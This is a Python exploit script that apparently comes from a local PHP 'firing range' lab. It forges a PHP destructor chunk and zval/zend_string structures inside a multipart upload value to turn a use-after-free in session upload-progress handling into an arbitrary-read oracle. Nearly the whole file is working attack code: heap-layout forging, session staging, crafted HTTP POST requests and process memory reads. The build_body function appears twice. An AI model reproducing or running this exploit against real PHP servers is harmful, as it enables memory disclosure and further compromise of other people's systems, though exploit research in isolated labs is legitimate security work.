#!/usr/bin/env python3
"""smb_oracle2.py — the dtor-chunk-forgery oracle (attempt-6).

Mechanism (gdb-verified): the producer's 75MB bailout leaves d intact
across the request boundary: d = {last=&d->entries (VALID), first_dtor=
last_dtor=<freed 4096B dtor chunk>, entries.used_slots=15, data[0..14]=
pointers into the freed dtor chunk at +0x10+i*16}.

Consumer: a ~4080B multipart VALUE part (single emalloc(4081) = ONE
page, no realloc chain) best-fits EXACTLY onto the freed dtor chunk's
page -> the producer's d->last_dtor and entries.data[i] pointers point
INTO OUR BYTES. Our bytes = a forged var_dtor_entries:
  used_slots@+0 = 15 (tmp_var appends at data[15], no fresh alloc)
  zvals@+0x10+i*16, i=0..14 (data[2] = fake zval -> fake zend_string
  "ORACLEWORKS!!!" at +0x800)
R:3 in the staged session (3MB file => ps_read string is an mmap,
never lands in the chunk pages) resolves data[2] = OUR zval ->
writeback echoes it => ARBITRARY READ ORACLE (self-verifying variant).
"""
import struct
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s

BND = b"G"
IS_STRING_EX = 0x106


def part(name, value):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"\r\n\r\n' + value + b"\r\n")


def file_part(name, value, filename=b"a.txt"):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name
            + b'"; filename="' + filename + b'"'
            b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")


def forge_dtor(chunk_addr, zval_value_off=0x18):
    """4080B value: its estrndup COPY (zend_string, val = these bytes at
    page+0x18) lands on the freed dtor chunk page. The zval that
    entries.data[2] (page+0x30) points at = value bytes at offset
    0x30-0x18 = 0x18. Fake zend_string at page+0x100 = value offset 0xE8."""
    b = bytearray(4080)
    fake_str = chunk_addr + 0x100
    struct.pack_into("<Q", b, zval_value_off, fake_str)
    struct.pack_into("<I", b, zval_value_off + 8, IS_STRING_EX)
    fs = zval_value_off + (0x100 - 0x30)
    struct.pack_into("<I", b, fs, 100)      # refcount
    struct.pack_into("<I", b, fs + 4, 6)    # gc type IS_STRING
    struct.pack_into("<Q", b, fs + 0x10, len(b"ORACLEWORKS!!!"))
    b[fs + 0x18:fs + 0x18 + 15] = b"ORACLEWORKS!!!\x00"
    return bytes(b)


def build_body(gsid, chunk_addr, filedata=b"z" * 4096, zval_value_off=0x18):
    g = forge_dtor(chunk_addr, zval_value_off)
    body = (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part(b"f", filedata) +
            b"--" + BND + b"--\r\n")
    return body


def build_body(gsid, chunk_addr, filedata=b"z" * 4096, zval_value_off=0x18):
    g = forge_dtor(chunk_addr, zval_value_off)
    body = (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part(b"f", filedata) +
            b"--" + BND + b"--\r\n")
    return body


def stage(sid, content, mode=600):
    if len(content) < 100000:
        import base64
        t64 = base64.b64encode(content).decode()
        q.docker_exec(q.CT["vuln"],
                      f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
                      f"chown nobody:nobody $F; chmod {mode} $F")
    else:
        subprocess.run(["docker", "exec", "-i", q.CT["vuln"], "sh", "-c",
                        f"cat > /tmp/sess_{sid} && chown nobody:nobody /tmp/sess_{sid} "
                        f"&& chmod {mode} /tmp/sess_{sid}"],
                       input=content, check=True, timeout=120)


def fire_main(body):
    import socket
    s2 = socket.create_connection(("127.0.0.1", 8151), timeout=25)
    s2.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary=G\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode() + body)
    buf = b""
    s2.settimeout(25)
    while True:
        try:
            d = s2.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    s2.close()
    return buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(reset)"


def find_bg(kind="vuln"):
    maps = s.get_maps(kind)
    hrs = s.heap_ranges(maps)
    segs = []
    for i, l in enumerate(maps):
        if "/usr/local/bin/php" in l and "rw-p" in l:
            a, b = [int(x, 16) for x in l.split()[0].split("-")]
            if i + 1 < len(maps):
                a2, b2 = [int(x, 16) for x in maps[i + 1].split()[0].split("-")]
                if a2 == b and "rw-p" in maps[i + 1] and "php" not in maps[i + 1]:
                    segs.append((a2, b2))
    if not segs:
        return None
    seg = s.read_mem(kind, segs[0][0], segs[0][1] - segs[0][0])
    for off in range(0, len(seg) - 15, 8):
        v = int.from_bytes(seg[off:off + 8], "little")
        lvl = int.from_bytes(seg[off + 8:off + 16], "little")
        if lvl == 1 and (v & 0xFFF) == 0 and s.looks_heap(v, hrs):
            return v
    return None


def main():
    print("=== ORACLE v2: forged dtor chunk via 1-page value part ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"o2{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    d = find_bg()
    print(f"remnant d = {hex(d) if d else None}")
    if not d:
        return 1
    # read d's fields to get the dtor chunk address (d->last_dtor)
    seg_d = s.read_mem("vuln", d, 0x48)
    last_dtor = int.from_bytes(seg_d[0x10:0x18], "little")
    used = int.from_bytes(seg_d[0x38:0x40], "little")
    print(f"d->last_dtor = {hex(last_dtor)} used_slots = {used}")
    for zoff in (0x18, 0x30):
        gsid = f"o2c{int(time.time())}"
        stage(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}' + b"A" * (3 * 1024 * 1024))
        body = build_body(gsid, last_dtor, zval_value_off=zoff)
        first = fire_main(body)
        rc, out = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{gsid} 2>/dev/null")
        hit = "ORACLEWORKS!!!" in out
        print(f"zval_off=0x{zoff:x}: consumer={first} HIT={hit} sess={out[:120]!r}")
        if hit:
            print("*** ORACLE LIVE ***")
            return 0
        # restart + re-produce for the next variant
        q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
        q.healthy(q.VULN, deadline=15)
        time.sleep(0.5)
        sid = f"o2{int(time.time())}"
        q.stage_producer("vuln", sid)
        q.mp_min(q.VULN, sid)
        d2 = find_bg()
        raw = s.read_mem("vuln", d2, 0x18)
        last_dtor = int.from_bytes(raw[0x10:0x18], "little")
    return 1


if __name__ == "__main__":
    sys.exit(main())
